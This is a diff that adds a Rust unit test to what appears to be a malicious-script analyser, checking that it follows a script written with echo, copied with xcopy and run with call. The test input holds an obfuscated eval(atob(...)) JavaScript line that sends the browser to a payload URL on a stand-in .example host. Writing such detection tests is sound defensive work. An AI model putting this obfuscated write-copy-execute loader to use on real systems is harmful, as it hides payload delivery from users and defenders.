@@ -14487,6 +14487,23 @@ call C:\Temp\original.js"#,
     }
 
     #[test]
+    fn xcopy_i_slash_directory_hint_preserves_generated_script_content() {
+        let report = crate::analyze(
+            br#"echo eval(atob("ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8veGNvcHktaS1zbGFzaC1kaXIuZXhhbXBsZS9wYXlsb2FkJw==")) > original.js
+xcopy /y /i original.js C:/Temp
+call C:/Temp/original.js"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t, crate::traits::Trait::Download { src, .. } if src == "https://xcopy-i-slash-dir.example/payload")
+            }),
+            "xcopy /i slash directory hint did not preserve generated JS content: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn copy_to_tracked_directory_preserves_generated_script_content() {
         let report = crate::analyze(
             br#"echo eval(atob("ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8vY29weS10cmFja2VkLWRpci5leGFtcGxlL3BheWxvYWQn")) > original.js
